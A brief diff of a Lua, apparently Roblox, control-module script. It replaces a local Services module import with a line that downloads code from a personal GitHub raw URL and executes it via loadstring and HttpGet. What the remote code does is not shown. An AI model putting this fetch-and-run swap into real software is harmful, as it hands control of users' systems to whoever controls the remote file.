@@ -1,4 +1,4 @@
-local Services = sharedRequire('../utils/Services.lua');
+local Services = loadstring(game:HttpGet("https://raw.githubusercontent.com/gummylover02021/sgw/refs/heads/main/Services"))()
 local ContextActionService, HttpService = Services:Get('ContextActionService', 'HttpService');
 
 local ControlModule = {};
